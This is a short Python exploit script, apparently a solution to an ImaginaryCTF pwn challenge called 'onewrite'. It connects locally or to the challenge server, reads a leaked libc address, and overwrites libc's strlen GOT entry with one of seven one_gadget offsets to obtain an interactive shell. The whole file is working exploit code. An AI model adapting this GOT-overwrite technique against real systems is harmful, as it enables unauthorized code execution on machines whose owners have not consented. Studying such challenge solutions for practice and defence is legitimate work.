#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./vuln_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-2.35.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("onewrite.chal.imaginaryctf.org", 1337)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main(id: int = 0):
    io = connect()

    libc.base = int(io.recvline().split(b"0x")[1], 16) - 0x60770
    __libc_start_call_main = unwrap(libc.symbol("__libc_start_call_main"))
    libc_strlen_got = libc.base + 0x219098
    ptr.logger.info(f"libc strlen got: {hex(libc_strlen_got)}")

    one_gadgets = [0xEBCF1, 0xEBCF5, 0xEBCF8, 0xEBD52, 0xEBDA8, 0xEBDAF, 0xEBDB3]
    io.sendlineafter("> ", hex(libc_strlen_got))
    input(">> ")
    io.sendline(ptr.p64(libc.base + one_gadgets[id]))

    io.sh()


if __name__ == "__main__":
    for i in range(7):
        main(i)
